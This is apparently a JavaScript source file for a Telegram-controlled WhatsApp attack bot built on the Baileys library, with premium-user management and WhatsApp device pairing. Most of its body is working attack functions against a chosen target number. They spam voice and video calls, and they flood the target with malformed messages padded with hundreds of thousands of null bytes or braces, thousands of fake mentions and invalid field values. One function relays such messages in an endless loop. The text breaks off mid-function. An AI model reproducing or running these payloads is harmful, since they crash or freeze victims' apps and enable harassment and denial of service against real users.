const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateForwardMessageContent,
  MediaType,
  aretargetsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  targetDecode,
  mentionedtarget,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  areJidsSameUser,
  jidDecode
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const vm = require('vm');
const https       = require("https");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/DAFARELXP/BLOODDB/refs/heads/main/tokens.json";

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.setMyCommands([
  { command: '/start', description: 'Developer Tercinta @pinzyoffc' }
]).then(() => {
    console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
    console.error('Gagal memperbarui perintah:', error);
});

function startBot() {
  console.clear();
  console.log(chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢤⠠⡔⣰⢂⡲⣄⠢⢄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠰⡇⢾⣬⣷⣽⣧⣿⣵⣾⠽⡎⡶⠡⠌⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠲⣢⢹⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠡⢘⣥⣻⢬⢻⣿⣿⣿⣿⣿⣿⣤⢿⣱⢷⢔⡀⠂⠄⠀⠀⠀⠀⠀⠀⠀⡈⡌⣰⣸⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⢂⡔⣧⣮⡾⣺⣗⣯⡿⠿⠿⠿⠾⣯⡽⣻⣭⡫⡻⣭⡘⠄⡀⠀⠀⠀⠀⠀⠁⠤⠍⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡐⢡⢊⢮⣾⣻⣪⡮⠊⠁⠀⠀⠀⠀⠀⠀⠈⢓⡷⡙⣮⡪⡻⡰⣀⠔⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠐⢂⣏⢻⣏⠓⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⡟⣿⣾⣿⣇⡟⣉⣿⡖⢳⣾⣰⣶⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⡠⢐⡼⣮⢯⣝⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣾⣽⣿⣿⣿⣿⣿⣾⣯⢿⣿⣷⡯⠛⠤⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡡⢚⣯⣯⣿⣾⡧⠀⠆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⠿⡟⠟⠩⠁⠂⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠟⢫⠙⠠⠁⠸⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⣠⣤⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⡉⡿⡈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢤⡚⡽⢿⢿⡿⣿⢿⡿⠿⠿⠿⠻⠯⠿⣿⣿⣯⣻⣿⠽⠟⠟⠛⠻⢛⡩⣵⡟⡢⣟⠏⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠂⠐⠀⠂⠀⠁⠈⠀⠁⠀⠂⠘⠫⣓⡷⡇⣿⣯⣴⣬⣿⡗⣟⣾⡿⡡⢊⠐⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠳⡝⣷⢾⢧⡷⣿⣿⠿⠉⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠃⡜⢚⠓⠃⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));

console.log(chalk.cyanBright(`
▀▀▄ ▀▄ ▄█ █░░ █▀▀ █▄░█ ▀█▀    █▀▀ █▀▄▀█ █▀█ █ █▀█ █▀▀
░▀▄ ▄▀ █▄ █▄▄ ██▄ █░▀█ ░█░    ██▄ █░▀░█ █▀▀ █ █▀▄ ██▄
`));

console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : Pinzy | Xyzen 
│ TELEGRAMA : @pinzyoffc
│ CHANAL : @XylentOfficial
└─────────────────────────────┘
`));
  console.log(chalk.blue("Xylent Empire Is Here...!"));
  console.log(chalk.magenta("🔐 Semua Terkunci."));
};

/*validateToken(); 
buat validate token kalo lu mau kasih db nya*/
startBot();
// buat start tanpa db kalo mau stary tanpa db tinggal ubah jadi startBot
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot.sendMessage(
    chatId,
    `<tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}`,
    { parse_mode: "HTML" }
  ).then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  // ✅ Request pairing code DI LUAR event listener
  // Tunggu socket ready dulu baru minta code
  if (!fs.existsSync(`${sessionDir}/creds.json`)) {
    await new Promise((resolve) => setTimeout(resolve, 3000)); // tunggu 3 detik
    try {
      const code = await sock.requestPairingCode(botNumber, "XYLENTNH");
      const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
      await bot.editMessageText(
        `<tg-emoji emoji-id="6098421155897545579">📢</tg-emoji> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "HTML",
        }
      );
    } catch (error) {
      console.error("Error requesting pairing code:", error);
      await bot.editMessageText(
        `Gagal melakukan pairing ke nomor ${botNumber}`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
      );
      return;
    }
  }

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode >= 500 && statusCode < 600) {
        // Server error, retry
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `Gagal melakukan pairing ke nomor ${botNumber}`,
          { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
        );
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber} 𝙨𝙪𝙘𝙘𝙚𝙨`,
        { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\

// NGAPA IN SIH?? 🥱
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~AMBIL SPEED AJA GUNA GK GUNA AMPOS
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

// BUAT TANGGAL TANGGALAN
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

function senderStatus(botNumber) {
  const sock = sessions.get(botNumber)

  if (!sock) return "🔴 OFFLINE"
  if (sock.user) return "🟢 CONNECTED"

  return "🟡 CONNECTING"
}


function getRandomImage() {
  const images = [
    "https://g.top4top.io/p_3788ghdlv1.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// CD DI SINI YA MEK

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}

async function delaxhard(sock, target) {
    console.log("XYLENT");
     {
        for (let i = 0; i < 100; i++) {
    const msg = {
        groupStatusMessageV2: {
            message: {
        albumMessage: {
                contextInfo: {
                    statusAttributionType: 1,
                    urlTrackingMap: {
                            "https://example.com": "{".repeat(500000)
                        },
                    mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1950 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
    serviceType: 3,
    expiryTimestamp: Date.now() + 60000
  }
                        }
                    }
                }
            }
        }
        }
    await sock.relayMessage(target,msg,{
        participant: { jid: target }
        })
    }}}
    
    async function X7Nganceng(sock, target, x) {
  var X71 = [];
  var X72 = Array.from({ length: 10000 }, () => ({}));

  var X73 = {
    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 388944,
      height: 1600,
      width: 1200,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        isQuestion: true,
        isGroupStatus: true
      },
      caption: "pinzyX7",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: "999",
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
    hasMediaAttachment: true
  };

  for (var r = 0; r < 98; r++) {
    X71.push({
      header: X73,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          data: X72.length
        })
      }
    });
  }

  while (true) {
    var X74 = generateWAMessageFromContent(
      target,
      {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "pinzyX7",
                format: "EXTENSION"
              },
              carouselMessage: {
                cards: X71,
                messageVersion: 1
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"pinzyX7\",\"address\":\"pinzyX7\",\"tower_number\":\"pinzyX7\",\"city\":\"Japanese\",\"name\":\"pinzyX7\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"pinzyX7 | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
              },
              messageParamsJson: JSON.stringify({
                data: X71.length
              })
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      X74.message,
      x
        ? {
            participant: { jid: target },
            messageId: X74.key.id
          }
        : {}
    );
  }
}

async function LupaApaW(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {

        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBQACBAYBAQEBAQEBAAAAAAAAAAAAAAACAwABBP/aAAwDAQACEAMQAAAAENmvlStHJb7mSvlY4Rb0vN1q2wkoZt1ei+ppWOV/n5vTuc1Djuu01bHPiBts8wniOg88secrtXb+oEOGoH7YOPVe1rFcnskW0+SMCDJ3dNWST//EACkQAAICAgEDAwMFAQAAAAAAAAECAAMREiEEMUETMlEQI3EFFCIkYaH/2gAIAQEAAT8AGRwI9lr/AG0ycwdKQBsss6YooOpltPKlVODKEIuKCNQ6oZs/zL6USstOjJ/cCBy9dbNyd4/IuViMY4iJlKePbKznr2Ms5rP4hXkz9TfWnXyZ0GfXUZhUJRgHz3j7743zOnLiltpQPv5x5h9phq5M68my4L8Sih9sqcGVr1Iwvdcx6AjwOgQCagWgg+Z4mglOtzlj5MfqDS+uoxBaBWDGvDHvLruPdKHJZfzPExKLSoEuxYNvInrMy4/5GeEglcylgtq8fVT7Zk6n8SrILH4mp7mIhawfERv7K4+YOw+gI2EBhVdDgcmMtuvbiCxU8Ss/eU/7F9omYnuE3A7mUWBmwe06h/5ar2gWs8ET0HSxDjjMRTqJ6TT/xAAeEQADAQACAgMAAAAAAAAAAAAAAQIRAyEQEgQxQf/aAAgBAgEBPwCF2aVjTPjqco44TXbwuM/Uxto469dFSWFFT0Ip/Rvt5a1+cP/EABwRAAMAAgMBAAAAAAAAAAAAAAABETFBAhAgIf/aAAgBAwEBPwAzokZw2JVkiJkTgsDaL1w2P4PpOLx//9k=",

          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },

          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",

          scanLengths: [
            999999999999999999,
            888888888888888888,
            777777777777777777,
            666666666666666666
          ],

          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        },
        pollCreationMessage: {
          name: "",
          options: [
            { optionName: "\u0000".repeat(9999)
             },
            { optionName: "\u0000".repeat(10000)
             },
            { optionName: "}"
             }
          ],
          selectableOptionsCount: 3
        }

      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null
  });
}

async function delayvisible(sock, target) {
  try {
    if (!sock.user) {
      console.log("❌ Session expired");
      return;
    }
    
    const mentions = Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`);
    
    const AiNew = [
      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net",
      "13135550202@s.whatsapp.net", "13135550202@s.whatsapp.net"
    ];
    
    const Msg1 = {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: "oconner-hard",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_OCONNER"
            },
            forwardingScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1
                  }
                }
              }
            }
          }
        }
      }
    };
    
    const Msg2 = {
      requestPaymentMessage: {
        currencyCodeIso4217: "IDR",
        amount1000: "9999",
        requestFrom: target,
        noteMessage: {
          extendedTextMessage: {
            text: '𝐗͢𝐘͢𝐋͢𝐄͢𝐍͢𝐓 𝐄͢𝐌͢𝐏͢𝐈͢𝐑͢𝐄'
          }
        },
        expiryTimestamp: Math.floor(Date.now() / 2500) + 98400,
        amount: {
          value: 1000,
          offset: 1000,
          currencyCode: 'IDR'
        },
        background: {
          id: '1'
        },
        contextInfo: {
          mentionedJid: mentions,
          remoteJid: AiNew,
          forwardingScore: 9999,
          isForwarded: true,
        }
      }
    };
    
    for (let r = 0; r < 50; r++) {
      await sock.relayMessage(target, Msg1, {
        participant: { jid: target }
      });
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      await sock.relayMessage(target, Msg2, {
        participant: { jid: target }
      });
      await new Promise(resolve => setTimeout(resolve, 3000));
      
      console.log(`✅ Sukses sent to ${target}`);
    }
    
  } catch (err) {
    console.error(`❌ Error: ${err.message}`);
  }
}

async function X7DelayHard(sock, target) {
    try {
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "𝖷𝟩",
                            matchedText: "https://t.me/fuckytim",
                            description: "𝖷𝟩",
                            title: "𝖷𝟩",
                            paymentLinkMetadata: {
                                button: {
                                    displayText: "#X7",
                                },
                                header: {
                                    headerType: 1,
                                },
                                provider: {
                                    paramsJson: "{{".repeat(120000),
                                },
                            },
                            linkPreviewMetadata: {
